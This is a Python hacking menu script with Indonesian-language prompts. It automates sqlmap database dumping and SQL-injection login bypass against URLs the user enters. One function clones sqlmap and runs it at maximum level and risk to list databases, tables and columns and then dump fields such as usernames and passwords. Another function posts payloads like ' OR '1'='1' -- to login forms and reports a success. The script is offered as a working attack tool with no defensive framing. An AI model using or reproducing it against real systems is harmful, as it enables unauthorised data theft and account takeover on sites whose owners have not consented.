import os
import time
import requests

# Warna teks
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[0;33m'
CYAN = '\033[1;36m'
MAGENTA = '\033[0;35m'
BOLD = '\033[1m'
RESET = '\033[0m'

VERSION = "1.0"

def bersih():
    os.system("clear" if os.name == "posix" else "cls")

def animasi_loading(pesan):
    animasi = "|/-\\"
    for i in range(10):
        print(f"\r{MAGENTA}{pesan} {animasi[i % len(animasi)]}{RESET}", end="", flush=True)
        time.sleep(0.1)
    print("")

def print_kz_logo():
    logo = f"""
{CYAN}   
   ⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
   ⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
   ⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂   Author  : Darkness./x.404
   ⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔   Tools   : SQLmap & Login Bypass
   ⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿⣿⣿⣿   Version : {VERSION}
   ⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
   ⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
   ⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠈
   ⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⡿⢋⢜⠠⠈
   ⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⣿⣶⣴⠈
{RESET}
    """
    bersih()
    print(logo)

def show_menu():
    print(f"{RED}================================================={RESET}")
    print(f"{RED}================< MENU TOOLS >==================={RESET}")
    print(f"{RED}================================================={RESET}")
    print(f"{MAGENTA} 1 -> Tools SQLmap (Dump Database){RESET}")
    print(f"{MAGENTA} 2 -> Login Bypass Exploit (Brute-Force){RESET}")
    print(f"{RED}================================================={RESET}")

def jalankan_sqlmap():
    print_kz_logo()
    print(f"{MAGENTA}Menjalankan SQLmap...{RESET}")
    
    if not os.path.exists("sqlmap"):
        os.system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git")
    
    os.chdir("sqlmap")
    target_url = input(f"{BOLD}Masukkan URL target (contoh: http://example.com/page?id=1): {RESET}")

    animasi_loading("Mengecek kerentanan target...")
    os.system(f"python3 sqlmap.py -u {target_url} --batch --dbs --level=5 --risk=3")

    database = input(f"{BOLD}Masukkan nama database yang ingin diakses: {RESET}")
    os.system(f"python3 sqlmap.py -u {target_url} -D {database} --tables --level=5 --risk=3")

    table = input(f"{BOLD}Masukkan nama tabel yang ingin diakses: {RESET}")
    os.system(f"python3 sqlmap.py -u {target_url} -D {database} -T {table} --columns --level=5 --risk=3")

    column = input(f"{BOLD}Masukkan nama kolom yang ingin di-dump (contoh: username,password): {RESET}")
    os.system(f"python3 sqlmap.py -u {target_url} -D {database} -T {table} -C {column} --dump --level=5 --risk=3")

    os.chdir("..")

def login_bypass():
    print_kz_logo()
    print(f"{MAGENTA}Menjalankan Login Bypass Exploit...{RESET}")
    target_url = input(f"{BOLD}Masukkan URL halaman login (contoh: http://example.com/login): {RESET}")

    payloads = [
        "' OR '1'='1' --",
        "' OR 'admin'='admin' --",
        "' OR 'x'='x' --",
        "' OR 'password'='password' --"
    ]

    for payload in payloads:
        data = {"username": payload, "password": "password"}
        animasi_loading(f"Mencoba payload: {payload}")
        
        try:
            response = requests.post(target_url, data=data)
            if "Welcome" in response.text or "Dashboard" in response.text:
                print(f"{GREEN}Login Bypass Berhasil! Payload: {payload}{RESET}")
                return
        except:
            print(f"{RED}Gagal menghubungi target!{RESET}")
            return

    print(f"{RED}Login Bypass Gagal! Coba metode lain.{RESET}")

def kembali_ke_menu():
    input(f"{GREEN}Tekan Enter untuk kembali ke menu...{RESET}")

def main():
    while True:
        print_kz_logo()
        show_menu()
        choice = input(f"{BOLD}Pilih Tools Yang Ingin Digunakan: {RESET}")
        
        if choice == '1':
            jalankan_sqlmap()
            kembali_ke_menu()

        elif choice == '2':
            login_bypass()
            kembali_ke_menu()

        elif choice.lower() in ['exit', 'keluar', 'q']:
            print(f"{GREEN}Terima kasih telah menggunakan tools ini!{RESET}")
            break

        else:
            print(f"{RED}Pilihan tidak valid, coba lagi.{RESET}")
            kembali_ke_menu()

if __name__ == "__main__":
    main()
